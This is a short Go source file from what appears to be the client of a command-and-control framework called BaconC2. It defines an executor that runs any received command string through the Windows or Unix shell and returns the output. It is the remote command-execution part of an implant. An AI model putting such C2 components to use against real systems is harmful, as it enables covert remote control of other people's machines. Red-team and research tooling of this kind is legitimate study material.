package executor

import (
	"bytes"
	"os/exec"
	"runtime"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
)

type DefaultCommandExecutor struct{}

func NewDefaultCommandExecutor() models.ICommandExecutor {
	return &DefaultCommandExecutor{}
}

func (e *DefaultCommandExecutor) Execute(cmd models.Command) models.Command {
	result := models.Command{
		ID:      cmd.ID,
		Command: cmd.Command,
	}

	var execCmd *exec.Cmd
	if isWindows() {
		execCmd = exec.Command("cmd", "/C", cmd.Command)
	} else {
		execCmd = exec.Command("sh", "-c", cmd.Command)
	}

	var stdout, stderr bytes.Buffer
	execCmd.Stdout = &stdout
	execCmd.Stderr = &stderr

	err := execCmd.Run()
	if err != nil {
		result.Status = "error"
		result.Output = stderr.String()
	} else {
		result.Status = "success"
		result.Output = stdout.String()
	}

	return result
}

func isWindows() bool {
	return runtime.GOOS == "windows"
}
